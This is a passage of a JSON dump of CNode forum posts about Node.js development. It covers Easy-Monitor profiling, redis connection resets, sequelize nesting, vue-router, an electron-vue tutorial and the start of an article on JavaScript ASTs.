Modal 框 (需要版本 &gt;= v2.1.0)，如图：</p>\n<p><img src=\"//static.cnodejs.org/Fs5uR6fP4CNATRKOub6FztDGteam\" alt=\"dynimic1.png\"></p>\n<p>弹出框具体每一项的内容和含义详见 <a href=\"http://easy-monitor.cn/document/#/?id=-%E5%BC%80%E5%90%AF%E5%8A%A8%E6%80%81%E6%9B%B4%E6%96%B0%E9%85%8D%E7%BD%AE\">开启动态更新配置</a> 。</p>\n<h2>OS 信息概览</h2>\n<p>进入监控 web 页面首页后，找到对应的项目，所在服务器选择你想查看的服务器，进程一项选择你想查看的进程，解析类型一项选择 <strong><em>OS</em></strong>，最后点击项目标题旁边的 <strong><em>start</em></strong> 按钮，如下图所示：</p>\n<p><img src=\"//static.cnodejs.org/FgpZXKZ-IQL1qbc25H5yQnNjHC9B\" alt=\"gailan2.png\"></p>\n<p>即可进入当前选中进程的概览信息页面，此页面可以看到服务器的 CPU 使用率，以及选中的进程的 Memory 占用情况，其中内存占用展示了三类：</p>\n<ul>\n<li>heapUsed: 正在使用的堆内内存大小</li>\n<li>heapTotal: 申请的总堆内内存大小</li>\n<li>rss: 堆外分配的内存大小</li>\n</ul>\n<p>如下图所示:</p>\n<p><img src=\"//static.cnodejs.org/FnYogKudNxd92qVSZ19cl3e4dWF5\" alt=\"gailan3.png\"></p>\n<p>这个 line-charts 展示模块的设计实现参考了 <a href=\"/user/JerryC8080\">@JerryC8080</a> 的 <strong>Memeye</strong> 项目，本文末和源码中做了特别标注。</p>\n<h2>CPU 数据采集分析函数运算瓶颈</h2>\n<h3>使用方法</h3>\n<p>进入监控 web 页面首页后，找到对应的项目，所在服务器选择你想查看的服务器，进程一项选择你想查看的进程，解析类型一项选择 <strong><em>CPU</em></strong>，最后点击项目标题旁边的 <strong><em>start</em></strong> 按钮，如下图所示：</p>\n<p><img src=\"//static.cnodejs.org/FmBkBDdxuGvnXZWKGMqt8U-6DOUC\" alt=\"cpu1.png\"></p>\n<p>如果你没有更改过启动参数，那么会进行 5s(<strong><em>默认值</em></strong>) 的 CPU-Profiling，然后进行分析，展示结果包含：</p>\n<ul>\n<li>执行耗费时间大于 500ms(<strong><em>默认值</em></strong>) 的函数列表</li>\n<li>执行耗费时间最长的 5个(<strong><em>默认值</em></strong>) 函数</li>\n<li>V8 引擎逆优化最频繁的 5个(<strong><em>默认值</em></strong>) 函数</li>\n</ul>\n<p>如图所示:</p>\n<p><img src=\"//static.cnodejs.org/FtKNJdfj59JdBP3NX75jFIwgoVgZ\" alt=\"cpu2.png\"></p>\n<p>这里可以看到，我们将鼠标移至 <strong><em>系统路径</em></strong> 一栏后，会在气泡框内展示出对应函数的完整的在服务器上的路径。下面解释下图表中的元素含义:</p>\n<h4>函数运算耗费时长相关</h4>\n<ul>\n<li><strong>函数名称:</strong> 即为编写的 js 函数名称</li>\n<li><strong>执行时长:</strong> 该函数的运算时长，注意如果函数内包含异步操作，那么异步操作花费的时间是不统计在内的。这个时长就是指纯函数本身占据CPU运算的时间，所以可以定位到 CPU 运算瓶颈点。</li>\n<li><strong>占据调用者百分比:</strong> 这里指的是本函数执行的时长占据调用者函数的总执行时长的百分比</li>\n<li><strong>系统路径:</strong> 函数在服务器的具体文件路径</li>\n</ul>\n<h4>引擎逆优化相关</h4>\n<ul>\n<li><strong>函数名称:</strong> 即为编写的 js 函数名称</li>\n<li><strong>逆优化原因:</strong> 此函数被 V8 引擎逆优化的原因</li>\n<li><strong>系统路径:</strong> 函数在服务器的具体文件路径</li>\n</ul>\n<h3>动态更改 CPU 配置，获得更多数据</h3>\n<p>上面使用方法一节中看到很多数值被标注为 <strong>默认值</strong>，这表示这些值我们可以通过动态修改 CPU-Profiling 的配置来进行调整，这是一个动态调整的例子:</p>\n<p>想对部署的项目进行压测 10 分钟，期间采集 CPU 数据，过滤出执行耗费大于 100ms 的函数，并且分析的结果每一项展示 50 条。</p>\n<p>那么可以按照上面提到的方法进入动态更新配置的 Modal 框，修改参数如下图所示:</p>\n<p><img src=\"//static.cnodejs.org/FoBe9uR_3WLbIPQi1eA3n-tHQWmd\" alt=\"cpu3.png\"></p>\n<p>修改完毕后，点击 Modal 弹出框右下角的 <strong><em>确定</em></strong> 按钮，即可通知服务器更改配置，保存成功后再按照上面的使用方法进行 CPU 数据采集和分析，等待约 10 分钟就可以看到结果。</p>\n<h4>关于CPU 动态配置中的自定义过滤</h4>\n<p>在上面的截图中可以看到，CPU 动态配置项中还有个按钮是 <strong>自定义过滤</strong>，这个是用来对 CPU 采集数据分析结过做过滤用的。</p>\n<p>项目默认会过滤掉路径中包含 <code>node_modules</code>、<code>anonymous</code> 等系统函数，这样可以保证结果中只包含开发者编写的函数，那么关闭自定义过滤的话会将系统函数也展示在内。</p>\n<p>自定义过滤函数大家也可以根据项目需求而自行注入，具体可以看开发文档中的介绍: <a href=\"http://127.0.0.1:12333/document/#/?id=-%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4\">自定义过滤</a>。</p>\n<h2>Memory 数据采集分析定位疑似内存泄漏点</h2>\n<h3>使用方法</h3>\n<p>进入监控 web 页面首页后，找到对应的项目，所在服务器选择你想查看的服务器，进程一项选择你想查看的进程，解析类型一项选择 <strong><em>MEM</em></strong>，最后点击项目标题旁边的 <strong><em>start</em></strong> 按钮，如下图所示：</p>\n<p><img src=\"//static.cnodejs.org/FraJnyH-LE9GFMdeBBtcwk5fxGwT\" alt=\"mem1.png\"></p>\n<p>页面会对堆内内存分析中间过程进行一些展示，提高体验，等分析完毕后，即会展示出对应的结果，如下图所示:</p>\n<p><img src=\"//static.cnodejs.org/Fo-Dq8Rj1fifLWqZKi-MBt1mPuhv\" alt=\"mem2.png\"></p>\n<p>这里根据分析当前进程堆内分配内存的结构，计算得出 RetainedSize 最大的节点占据总的堆内分配内存占比来判断是否有内存泄漏风险，以及对应的疑似泄漏节点引力图。</p>\n<p>这一部分引力图详细定位内存泄漏点的逻辑和 Easy-Monitor 1.x 没有变化，可以参见上一篇文章来获取详情: <a href=\"https://cnodejs.org/topic/58eb5d378cda07442731569f\">轻松排查线上Node内存泄漏问题</a></p>\n<h3>动态更改 Memory 配置，获得更多数据</h3>\n<p>Memory 分析同样也提供了一些可以动态更改的配置，试看如下场景:</p>\n<p>Node 项目发生内存泄漏时，想获取更多的疑似内存泄漏点，以及需要更多的子节点信息和引力图深度来排查定位内存泄漏点，那么我们可以通过修改提供的动态配置来达到不重启服务器即可生效的目的，如下图所示:</p>\n<p><img src=\"//static.cnodejs.org/FoGh6Ewdp2AmGj0CnrykNy49xHxh\" alt=\"mem3.png\"></p>\n<p>这里将默认的展示 5 个疑似内存泄漏点更改为 10 个，将引力图的每一个节点的展开子节点数从默认的 5 个更改为 8 个，将引力图深度从默认的 25 更改为 50，这样就能获取到更多的内存信息。</p>\n<h4>关于 Memory 动态配置中的 Root 节点配置</h4>\n<p>Root 节点信息的展示是帮助大家更深入地理解当前的堆内内存结构，对于排查内存泄漏并没有太大帮助，但是这一项打开后会增加浏览器下载的 HeapSnapshot 分析结果数据大小，可以将其关闭掉。</p>\n<h1>VI. 特别感谢</h1>\n<p>重构过程中思路参考了一些开源项目，在最后特别感谢下 <a href=\"/user/JerryC8080\">@JerryC8080</a>：</p>\n<ul>\n<li><strong>Memeye:</strong> 作者为 <a href=\"https://github.com/JerryC8080\">JerryC8080</a>，2.0 版本的 overview 页面实现和 logger 模块实现参考了 <a href=\"https://github.com/JerryC8080/Memeye\">Memeye</a> 项目</li>\n</ul>\n<p>源代码中对应位置也做了标注，感谢作者们的开源精神。</p>\n<h1>VII. 结语</h1>\n<p>Easy-Monitor 项目我个人会长期维护下去，下一阶段的计划大致如下：</p>\n<ul>\n<li>\n<ol>\n<li>研究下 Node 8 提供的 N-API，以将计算量巨大的 CPU 和 HeapsnapSnapshot 运算解析部分移植成扩展，放入单独的计算线程中来进一步提升性能。</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>研究下 Chrome 最新提供的 Record Allocation Profiler 和 Record Allocation Timeline 的实现，看看能不能合并入 Easy-Monitor 的 Memory 分析部分实现线上 Node 项目的实时分析。</li>\n</ol>\n</li>\n</ul>\n<p>最后本项目地址在 <a href=\"https://github.com/hyj1991/easy-monitor\">Easy-Monitor</a> ，如果使用中遇到问题可以提 <a href=\"https://github.com/hyj1991/easy-monitor/issues\">issue</a> ，保证快速响应。</p>\n<p>如果本项目对您有用欢迎 star，如果想一起开发或者有更多想法也欢迎联系我~</p>\n</div>","title":"Easy-Monitor 2.0: 开启你的  Node.js 内核性能监控","last_reply_at":"2019-03-06T02:17:00.898Z","good":false,"top":false,"reply_count":48,"visit_count":18925,"create_at":"2017-06-25T08:02:41.731Z","author":{"loginname":"hyj1991","avatar_url":"https://avatars2.githubusercontent.com/u/19908330?v=4&s=120"}},{"id":"5c7e9a0d90c14711cc8ca9d8","author_id":"5c7953365b8cb21491ca510f","tab":"ask","content":"<div class=\"markdown-text\"><p>什么方法</p>\n</div>","title":"vue中怎样监听路由？？","last_reply_at":"2019-03-06T01:09:31.356Z","good":false,"top":false,"reply_count":2,"visit_count":569,"create_at":"2019-03-05T15:47:25.135Z","author":{"loginname":"qiuchenlu123","avatar_url":"https://avatars0.githubusercontent.com/u/48122764?v=4&s=120"}},{"id":"5c7e617290c14711cc8ca939","author_id":"58d140302c8bf2a836456213","tab":"ask","content":"<div class=\"markdown-text\"><p>使用<a href=\"https://www.npmjs.com/package/redis\">redis</a>模块</p>\n<pre class=\"prettyprint language-javascript\"><code>const Promise = require(&quot;bluebird&quot;);\nconst redis = require(&quot;redis&quot;);\n    \nPromise.promisifyAll(redis.RedisClient.prototype);\nPromise.promisifyAll(redis.Multi.prototype);\n\nvar RedisClient = redis.createClient(&quot;192.168.59.101&quot;, 6379);\n\nRedisClient.on(&quot;connect&quot;, () =&gt; {\n    logger.info(&quot;connect to redis success&quot;);\n});\n\nRedisClient.on(&quot;error&quot;, err =&gt; {\n    console.error(err);\n});\n</code></pre><p>ECONNRESET每隔2个小时发生一次：</p>\n<pre class=\"prettyprint language-json\"><code>{\n    &quot;syscall&quot;: &quot;read&quot;,\n    &quot;code&quot;: &quot;ECONNRESET&quot;,\n    &quot;errno&quot;: &quot;ECONNRESET&quot;\n}\n</code></pre><p>这个问题似乎和<a href=\"http://tldp.org/HOWTO/TCP-Keepalive-HOWTO/usingkeepalive.html\">TCP keepalive</a>有关，因为tcp_keepalive_time是7200秒，刚好是2个小时。。</p>\n<pre class=\"prettyprint language-bash\"><code>cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_keepalive_time\n7200\n</code></pre><p>Github上看到有遇到类似情况的，但是木有解决方案，大家知道这是什么原因么</p>\n</div>","title":"redis连接每隔2个小时报错ECONNRESET","last_reply_at":"2019-03-06T00:43:57.497Z","good":false,"top":false,"reply_count":2,"visit_count":411,"create_at":"2019-03-05T11:45:54.376Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c7f13865b8cb21491ca6415","author_id":"518b456f63e9f8a542401edf","tab":"ask","content":"<div class=\"markdown-text\"><p>nwjs如何使用wfs.js播放视频？我试过似乎无效。\nwfs.js是这个模块\n<a href=\"https://github.com/ChihChengYang/wfs.js\">https://github.com/ChihChengYang/wfs.js</a></p>\n</div>","title":"nwjs如何使用wfs.js播放视频？我试过似乎无效","last_reply_at":"2019-03-06T00:25:42.145Z","good":false,"top":false,"reply_count":0,"visit_count":508,"create_at":"2019-03-06T00:25:42.145Z","author":{"loginname":"Einsy","avatar_url":"https://avatars0.githubusercontent.com/u/2882139?v=4&s=120"}},{"id":"5c7e80d390c14711cc8ca989","author_id":"5c7953365b8cb21491ca510f","tab":"ask","content":"<div class=\"markdown-text\"><p>route.push({path:,’/’})</p>\n</div>","title":"vue-router怎样使用？？","last_reply_at":"2019-03-05T14:49:27.218Z","good":false,"top":false,"reply_count":1,"visit_count":336,"create_at":"2019-03-05T13:59:47.433Z","author":{"loginname":"qiuchenlu123","avatar_url":"https://avatars0.githubusercontent.com/u/48122764?v=4&s=120"}},{"id":"5b17b47e29e6e510415b287f","author_id":"5a6d779eafa0a121784a9088","tab":"ask","content":"<div class=\"markdown-text\"><p>多表连接查询数据嵌套过深有没有遇到？\n以前是连四张表成功时返回的数据。\n大致一张发布表，一张评价表（谁回复谁），一张用户表，一张主题表。\n有的对象其实不想嵌套的。比如\n<img src=\"//static.cnodejs.org/FmlyeetWxApJL43GspjFqzm-JiWC\" alt=\"image.png\">\n通过uid查找谁发布的，user对象里边的内容能否直接解放出去？</p>\n<p>同理topicId查找到的主题\n<img src=\"//static.cnodejs.org/Fu_6Z3RzAtWkE4I8ZDLbF9ZyMTbS\" alt=\"image.png\">\n在comment评价中还有好几个一样的嵌套。救救\n有没有什么方法合并，解决嵌套对象。？？？</p>\n<pre class=\"prettyprint\"><code>\n    {\n        &quot;infoId&quot;: 1,\n        &quot;uid&quot;: 1,\n        &quot;topicId&quot;: 1,\n        &quot;content&quot;: &quot;1&quot;,\n        &quot;like_count&quot;: 21,\n        &quot;post_count&quot;: 1,\n        &quot;updatedAt&quot;: &quot;2018-06-06T07:10:33.000Z&quot;,\n        &quot;user&quot;: {\n            &quot;uid&quot;: 1,\n            &quot;username&quot;: &quot;陈二&quot;,\n            &quot;avatar&quot;: &quot;https:&#x2F;&#x2F;wx.qlogo.cn&#x2F;mmopen&#x2F;vi_32&#x2F;Q0j4TwGTfTIHmiadgySExiakKxsHobq70sxZDyic1BORkNqJ5nezISMeZoh1om6ysG53dbAoYjK0FetXV83O8icUiaw&#x2F;132&quot;\n        },\n        &quot;topic&quot;: {\n            &quot;topicId&quot;: 1,\n            &quot;title&quot;: &quot;孤独&quot;,\n            &quot;des&quot;: &quot;你有朋友吗，有那种可以深夜想聊天，一个电话就能找到的朋友。没有吧&quot;\n        },\n        &quot;comments&quot;: [\n            {\n                &quot;id&quot;: 2,\n                &quot;infoId&quot;: 1,\n                &quot;from_uid&quot;: 1,\n                &quot;to_uid&quot;: 1,\n                &quot;topic_id&quot;: 1,\n                &quot;content&quot;: &quot;nidayede&quot;,\n                &quot;from&quot;: {\n                    &quot;uid&quot;: 1,\n                    &quot;username&quot;: &quot;陈韦4&quot;\n                },\n                &quot;to&quot;: {\n                    &quot;uid&quot;: 1,\n                    &quot;username&quot;: &quot;六六&quot;\n                }\n            },\n            {\n                &quot;id&quot;: 3,\n                &quot;infoId&quot;: 1,\n                &quot;from_uid&quot;: 1,\n                &quot;to_uid&quot;: 1,\n                &quot;topic_id&quot;: 1,\n                &quot;content&quot;: &quot;nidayede&quot;,\n                &quot;from&quot;: {\n                    &quot;uid&quot;: 1,\n                    &quot;username&quot;: &quot;琪琪&quot;\n                },\n                &quot;to&quot;: {\n                    &quot;uid&quot;: 1,\n                    &quot;username&quot;: &quot;让她&quot;\n                }\n            },\n            {\n                &quot;id&quot;: 1,\n                &quot;infoId&quot;: 1,\n                &quot;from_uid&quot;: 1,\n                &quot;to_uid&quot;: 2,\n                &quot;topic_id&quot;: 1,\n                &quot;content&quot;: &quot;1&quot;,\n                &quot;from&quot;: {\n                    &quot;uid&quot;: 1,\n                    &quot;username&quot;: &quot;哈哈&quot;\n                },\n                &quot;to&quot;: {\n                    &quot;uid&quot;: 2,\n                    &quot;username&quot;: &quot;陈&quot;\n                }\n            }\n        ],\n        &quot;thumbsUps&quot;: [\n            {\n                &quot;id&quot;: 1,\n                &quot;infoId&quot;: 1,\n                &quot;uid&quot;: 1,\n                &quot;user&quot;: {\n                    &quot;uid&quot;: 1,\n                    &quot;avatar&quot;: &quot;https:&#x2F;&#x2F;wx.qlogo.cn&#x2F;mmopen&#x2F;vi_32&#x2F;Q0j4TwGTfTIHmiadgySExiakKxsHobq70sxZDyic1BORkNqJ5nezISMeZoh1om6ysG53dbAoYjK0FetXV83O8icUiaw&#x2F;132&quot;\n                }\n            },\n            {\n                &quot;id&quot;: 2,\n                &quot;infoId&quot;: 1,\n                &quot;uid&quot;: 1,\n                &quot;user&quot;: {\n                    &quot;uid&quot;: 1,\n                    &quot;avatar&quot;: &quot;https:&#x2F;&#x2F;wx.qlogo.cn&#x2F;mmopen&#x2F;vi_32&#x2F;Q0j4TwGTfTIHmiadgySExiakKxsHobq70sxZDyic1BORkNqJ5nezISMeZoh1om6ysG53dbAoYjK0FetXV83O8icUiaw&#x2F;132&quot;\n                }\n            }\n        ]\n    }\n</code></pre></div>","title":"如何解决sequelize连表查询嵌套太深的问题，急急急","last_reply_at":"2019-03-05T13:30:56.170Z","good":false,"top":false,"reply_count":11,"visit_count":1677,"create_at":"2018-06-06T10:16:30.256Z","author":{"loginname":"Chen-WeiZhen","avatar_url":"https://avatars1.githubusercontent.com/u/18025841?v=4&s=120"}},{"id":"5c7e361590c14711cc8ca842","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><h1>用 Vue 建立一个简单的 electron 桌面应用</h1>\n<h2>1. electron简介</h2>\n<h2>2. 工具介绍</h2>\n<h2>3. 实践效果，步骤</h2>\n<p>1）一个简单的 Electron 桌面应用都是冲 Hello World！ 开始的</p>\n<p><img src=\"//static.cnodejs.org/FkOo9B0rV9WHPe4h6Cb39CpqPyvy\" alt=\"ele1.png\"></p>\n<p>以上是使用 electron-vue 超级迅速制作出来的 electron 桌面应用。</p>\n<p>2）安装的组件</p>\n<p><code>vue init simulatedgreg/electron-vue white-electron-first</code></p>\n<p><img src=\"//static.cnodejs.org/FtUglYJ0X6cJIXNi6m0RbtMXxoeG\" alt=\"ele2.png\"></p>\n<p>3）build tool choice ？</p>\n<p>构建工具的选择，比较先进的是electron-builder</p>\n<p>实际上调试，开发可以直接选择 electron-builder，它支持热更新，像目前大部分在使用的 vue-cli 构建出来的项目一样保存即更新。</p>\n<p>如果是简单打包应用就直接选择 electron-packager 就好了，功能比较简单。</p>\n<p>参考链接：<a href=\"https://electron.org.cn/vue/building_your_app.html\">https://electron.org.cn/vue/building_your_app.html</a></p>\n<p><img src=\"//static.cnodejs.org/FpqfeNPROW-KcM0Cp9Op-SxRS0FN\" alt=\"ele3.png\"></p>\n<ol>\n<li>下一步</li>\n</ol>\n<pre class=\"prettyprint\"><code>&gt; npm i  &#x2F;&#x2F; 装包\n&gt; npm run dev  &#x2F;&#x2F; 测试环境运行\n</code></pre><p>就可以有一个初步的Electron桌面应用了</p>\n<h2>4. 如何将网站只做成 ELectron 应用？</h2>\n<p>1）网站页面</p>\n<p><img src=\"//static.cnodejs.org/FthI0NaZFuhz7Q_kRdlX3LsD8-Q7\" alt=\"ele4.png\"></p>\n<p>to 桌面应用</p>\n<p><img src=\"//static.cnodejs.org/Fj7BOib2mO-ZVr-Ad8MQVRiCAabx\" alt=\"ele5.png\"></p>\n<p>2）熟悉 node 的朋友都知道，启动一个 node 程序，通常就是 <code>node app.js</code> 之类的</p>\n<p>把这个 Node 应用转换成一个 Electron 应用也是非常简单的，我们只不过是把 <code>node</code> 运行时替换成了 <code>electron</code>运行时。<br>\npackage.json如下</p>\n<pre class=\"prettyprint\"><code>json\n{\n    &quot;script&quot;: {\n        &quot;electron&quot;: &quot;electron build&#x2F;electron.js&quot;,\n    }\n}\n</code></pre><p>Electron.js (一般启动项目写在main.js，具体看项目) 这个文件应该怎样写呢，这种基本都是参考成熟项目的，一般简单的如：</p>\n<pre class=\"prettyprint language-\"><code>js\n&#x2F;&#x2F; electron.js&quot;\nconst {app, BrowserWindow} = require(&#x27;electron&#x27;)\n  \n  &#x2F;&#x2F; Keep a global reference of the window object, if you don&#x27;t, the window will\n  &#x2F;&#x2F; be closed automatically when the JavaScript object is garbage collected.\n  let win\n  \n  function createWindow () {\n    &#x2F;&#x2F; 创建浏览器窗口。\n    win = new BrowserWindow({width: 800, height: 600})\n  \n    &#x2F;&#x2F; 然后加载应用的 index.html。\n    win.loadFile(&#x27;index.html&#x27;)\n  \n    &#x2F;&#x2F; 打开开发者工具\n    win.webContents.openDevTools()\n  \n    &#x2F;&#x2F; 当 window 被关闭，这个事件会被触发。\n    win.on(&#x27;closed&#x27;, () =&gt; {\n      &#x2F;&#x2F; 取消引用 window 对象，如果你的应用支持多窗口的话，\n      &#x2F;&#x2F; 通常会把多个 window 对象存放在一个数组里面，\n      &#x2F;&#x2F; 与此同时，你应该删除相应的元素。\n      win = null\n    })\n  }\n  \n  &#x2F;&#x2F; Electron 会在初始化后并准备\n  &#x2F;&#x2F; 创建浏览器窗口时，调用这个函数。\n  &#x2F;&#x2F; 部分 API 在 ready 事件触发后才能使用。\n  app.on(&#x27;ready&#x27;, createWindow)\n  \n  &#x2F;&#x2F; 当全部窗口关闭时退出。\n  app.on(&#x27;window-all-closed&#x27;, () =&gt; {\n    &#x2F;&#x2F; 在 macOS 上，除非用户用 Cmd + Q 确定地退出，\n    &#x2F;&#x2F; 否则绝大部分应用及其菜单栏会保持激活。\n    if (process.platform !== &#x27;darwin&#x27;) {\n      app.quit()\n    }\n  })\n  \n  app.on(&#x27;activate&#x27;, () =&gt; {\n    &#x2F;&#x2F; 在macOS上，当单击dock图标并且没有其他窗口打开时，\n    &#x2F;&#x2F; 通常在应用程序中重新创建一个窗口。\n    if (win === null) {\n      createWindow()\n    }\n  })\n  \n  &#x2F;&#x2F; 在这个文件中，你可以续写应用剩下主进程代码。\n  &#x2F;&#x2F; 也可以拆分成几个文件，然后用 require 导入。\n\n</code></pre><p>上文代码中有一段<code>win.loadFile('index.html')</code>的代码，意味着你的入口页面就是 index.html, 就像我们用electron-vue 模板启动的 hello world 一样。</p>\n<ol>\n<li>我们的 view 应用实际上就是一个 SPA 的页面，打包出来后也会有这个入口index.html 文件。</li>\n</ol>\n<p>于是 <code>npm run build</code> 先 build 出 dist 文件后，electron.js 的 index.html 替换成 dist 目录下的 html 文件之后，出现以下问题：打包出来的 css、js 文件访问不到了。</p>\n<p><img src=\"//static.cnodejs.org/Fvv75qbimGbqMJdt2SrDNoqnpRaC\" alt=\"ele6.png\"></p>\n<p>据此文档说是可以解决的 <a href=\"https://blog.csdn.net/m0_37604745/article/details/79303342\">https://blog.csdn.net/m0_37604745/article/details/79303342</a></p>\n<p>应该是应用版本不同，我们项目用的 webpack 找不到以上配置，于是直接改了 index.html 里面的 css，js 引用路径。</p>\n<p><img src=\"//static.cnodejs.org/FtUl9glSyGLUR5CACf1jfkSPAm7h\" alt=\"ele7.png\"><br>\n由于我们服务加载前必须先访问登陆系统，前端项目在没有配 ha 的情况下，单独的运行个静态前端项目是不行的呢。<br>\n然而，还是做到了。<br>\n实际也比较简单：直接把这段代码改成</p>\n<pre class=\"prettyprint language-\"><code>javascript\n&#x2F;&#x2F; 然后加载应用的 index.html\nwin.loadFile(&#x27;index.html&#x27;)  \n\n\n&#x2F;&#x2F; to 本地服务的地址就好了\n\nwin.loadUrl(&#x27;http:&#x2F;&#x2F;localhost:4000&#x27;)  \n\n</code></pre><p>目前这是最简单的打包一个已有应用成 electron 应该的方法。（笑）</p>\n<hr>\n<p><em>参考资料：</em></p>\n<p><em><a href=\"https://www.qcode.in/convert-vue-js-app-native-desktop-app-using-electron/\">https://www.qcode.in/convert-vue-js-app-native-desktop-app-using-electron/</a></em></p>\n<p><em><a href=\"https://electronjs.org/docs/tutorial/first-app\">https://electronjs.org/docs/tutorial/first-app</a></em></p>\n<p>*<a href=\"https://newsn.net/say/electron-vue-demo-mac-builder.html%E2%80%94%E2%80%94\">https://newsn.net/say/electron-vue-demo-mac-builder.html——</a> from 苏南大叔的《<a href=\"https://newsn.net/\">程序如此灵动~</a>》博客</p>\n<p><em><a href=\"https://www.jianshu.com/p/6b32763195cc\">https://www.jianshu.com/p/6b32763195cc</a></em></p>\n<p><em><a href=\"https://www.qcode.in/convert-vue-js-app-native-desktop-app-using-electron/\">https://www.qcode.in/convert-vue-js-app-native-desktop-app-using-electron/</a></em></p>\n</div>","title":"用 Vue 建立一个简单的 electron 桌面应用","last_reply_at":"2019-03-05T11:33:09.750Z","good":false,"top":false,"reply_count":1,"visit_count":491,"create_at":"2019-03-05T08:40:53.536Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5c46759e3b948a2b4ab70483","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> JS的&quot;编译原理&quot;。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000017961297\">JavaScript的工作原理：解析、抽象语法树（AST）+ 提升编译速度5个技巧</a></li>\n<li>作者：<a href=\"https://segmentfault.com/a/1190000017794020\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p>这是专门探索 JavaScript 及其所构建的组件的系列文章的第 14 篇。</p>\n<p>如果你错过了前面的章节，可以在这里找到它们：</p>\n<ul>\n<li><a href=\"https://segmentfault.com/a/1190000017352941\">JavaScript 是如何工作的：引擎，运行时和调用堆栈的概述！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017369465\">JavaScript 是如何工作的：深入V8引擎&amp;编写优化代码的5个技巧！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017392370\">JavaScript 是如何工作的：内存管理+如何处理4个常见的内存泄漏 !</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017419328\">JavaScript 是如何工作的：事件循环和异步编程的崛起+ 5种使用 async/await 更好地编码方式！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017448270\">JavaScript 是如何工作的：深入探索 websocket 和HTTP/2与SSE +如何选择正确的路径！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017485968\">JavaScript 是如何工作的：与 WebAssembly比较 及其使用场景 !</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017578650\">JavaScript 是如何工作的：Web Workers的构建块+ 5个使用他们的场景!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017749922\">JavaScript 是如何工作的：Service Worker 的生命周期及使用场景!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017794020?_ea=6014340#articleHeader0\">JavaScript 是如何工作的：Web 推送通知的机制!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017832686\">JavaScript是如何工作的：使用 MutationObserver 跟踪 DOM 的变化!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017872125#articleHeader0\">JavaScript是如何工作的：渲染引擎和优化其性能的技巧!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017903157\">JavaScript是如何工作的：深入网络层 + 如何优化性能和安全!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017927665\">JavaScript是如何工作的：CSS 和 JS 动画底层原理及如何优化它们的性能！</a>-</li>\n</ul>\n<h3>概述</h3>\n<p>我们都知道运行一大段 JavaScript 代码性能会变得很糟糕。这段代码不仅需要通过网络传输，而且还需要解析、编译成字节码，最后执行。在之前的文章中，我们讨论了 JS 引擎、运行时和调用堆栈等，以及主要由谷歌 Chrome 和 NodeJS 使用的V8引擎。它们在整个 JavaScript 执行过程中都发挥着至关重要的作用。这篇说的抽象语法树同样重要:在这我们将了解大多数 JavaScript 引擎如何将文本解析为对机器有意义的内容，转换之后发生的事情以及做为 Web 开发者如何利用这一知识。</p>\n<h3>编程语言原理</h3>\n<p>那么，首先让我们回顾一下编程语言原理。不管你使用什么编程语言，你需要一些软件来处理源代码以便让计算机能够理解。该软件可以是解释器，也可以是编译器。无论你使用的是解释型语言(JavaScript、Python、Ruby)还是编译型语言(c#、Java、Rust)，都有一个共同的部分:将源代码作为纯文本解析为 <strong>抽象语法树(abstract syntax tree, AST)</strong> 的数据结构。</p>\n<p><strong>AST</strong> 不仅以结构化的方式显示源代码，而且在语义分析中扮演着重要角色。在语义分析中，编译器验证程序和语言元素的语法使用是否正确。之后，使用 AST 来生成实际的字节码或者机器码。</p>\n<blockquote>\n<p>抽象语法树（abstract syntax tree 或者缩写为 AST），或者语法树（syntax tree），是源代码的抽象语法结构的树状表现形式，这里特指编程语言的源代码。和抽象语法树相对的是具体语法树（concrete syntaxtree），通常称作分析树（parse tree）。一般的，在源代码的翻译和编译过程中，语法分析器创建出分析树。一旦 AST 被创建出来，在后续的处理过程中，比如语义分析阶段，会添加一些信息。</p>\n</blockquote>\n<h3>AST 程序</h3>\n<p>AST 不仅仅是用于语言解释器和编译器，在计算机世界中，它们还有多种应用。使用它们最常见的方法之一是进行静态代码分析。静态分析器不执行输入的代码，但是，他们仍然需要理解代码的结构。</p>\n<p>例如，你可能想要实现一个工具，该工具可以找到公共代码结构，以便你可以重构它们以减少重复。你可能会通过使用字符串比较来实现这一点，但这个会相当简单且有局限性。</p>\n<p>当然，如果你对实现这样的工具感兴趣，你不需要编写自己的解析器。有许多与 Ecmascript规范完全兼容的开源项目。<strong>Esprima</strong> 和 <strong>Acorn</strong> 即是黄金搭档，还有许多工具可以帮助解析器生成输出，即 <strong>ASTs</strong> ，ASTs 被广泛应用于代码转换。</p>\n<p>例如，你可能希望实现一个将 Python 代码转换为J avaScript 的转换器。基本思想是使用Python 转换器生成 AST，然后使用 AST 生成JavaScript代码。</p>\n<p>你可能会觉得难以置信，事实是 ASTs 只是部分语言的不同表示法。在解析之前，它被表示为遵循一些规则的文本，这些规则构成了一种语言。在解析之后，它被表示为一个树结构，其中包含与输入文本完全相同的信息。因此，也可以进行反向解析然后回到文本。</p>\n<p><strong>代码部署后可能存在的BUG没法实时知道，事后为了解决这些BUG，花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具<a href=\"https://www.fundebug.com/?utm_source=xiaozhi\">Fundebug</a>。</strong></p>\n<h3>JavaScript 